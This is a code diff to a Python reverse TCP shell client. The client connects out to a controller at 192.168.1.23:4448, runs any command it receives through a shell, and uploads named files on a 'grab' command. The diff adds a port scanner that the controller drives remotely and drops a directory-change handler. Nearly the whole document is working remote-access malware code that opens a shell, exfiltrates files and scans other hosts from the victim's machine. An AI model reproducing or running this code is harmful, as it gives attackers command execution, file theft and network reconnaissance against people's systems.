@@ -1,7 +1,7 @@
-#  grab with navigation reverse tcp
+#  grab and port scanner  reverse tcp
+import os
 import socket
 import subprocess
-import os
 
 def transfer(s, path):
     if os.path.exists(path):
@@ -12,11 +12,23 @@ def transfer(s, path):
             packet = f.read(1024)
         s.send('DONE'.encode())
         f.close()
-    else:
-        s.send('Unable to find out the file'.encode())
 
+def scanner(s, ip, ports):
+    scan_result = ''
+    for port in ports.split(','):
+        try: #
+            sock =  socket.socket()
+            output = sock.connect_ex((ip, int(port)))
+            if output == 0:
+                scan_result = scan_result + "[+] Port " + port + " is opened" + "\n"
+            else:
+                scan_result = scan_result + "[-] Port " + port + " is closed"
+                sock.close()
+        except Exception as e:
+            pass
+    s.send(scan_result.encode())
 def connect():
-    s = socket.socket()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('192.168.1.23', 4448))
     while True:
         command = s.recv(1024)
@@ -27,16 +39,14 @@ def connect():
             grab, path = command.decode().split('*')
             try:
                 transfer(s, path)
-            except Exception as e:
+            except:
                 s.send(str(e).encode())
                 pass
-        elif 'cd' in command.decode():
-            code, directory = command.decode().split('*')
-            try:
-                os.chdir(directory)
-                s.send(('[+] CWD is ' + os.getcwd()).encode())
-            except Exception as e:
-                s.send(('[-]  ' + str(e)).encode())
+
+        elif 'scan' in command.decode(): #
+            command = command[5:].decode()
+            ip, ports = command.split(':')
+            scanner(s, ip, ports)
         else:
             CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s.send(CMD.stdout.read())
@@ -46,4 +56,3 @@ def main():
     connect()
 
 main()
-
